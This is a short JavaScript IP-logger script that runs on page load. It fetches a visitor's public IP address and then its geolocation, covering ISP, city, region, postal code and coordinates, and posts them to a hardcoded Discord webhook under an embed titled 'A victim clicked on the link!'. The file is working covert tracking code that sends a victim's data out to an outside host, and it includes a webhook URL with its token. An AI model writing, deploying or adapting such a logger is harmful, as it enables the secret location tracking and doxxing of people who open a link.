const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch('https://ipwho.is/')  // CORRIGIDO: API com CORS
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1434608236673368084/AFQ-LUDSvqZxcGzn-6-gd8D84KTdZUn20ykWjvoYhg52IKkxvgAn-xIjcAmjdA1AAu5y'; // SEU WEBHOOK

                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "H_LOGGER",
                            avatar_url: "https://www.mediafire.com/view/03dfv959nfnvdjm/fpxpmk.jpg",
                            content: `@hyper_r7100`,
                            embeds: [
                                {
                                    title: 'A victim clicked on the link!',
                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.connection?.isp || 'N/A'}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                    color: 0x800080
                                }
                            ]
                        })
                    }).then(dscResponse => {  // CORRIGIDO: .then no fetch do Discord
                        if (dscResponse.ok) {
                            console.log('Sent! <3');
                        } else {
                            console.log('Failed :(');
                        }
                    });
                });
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();
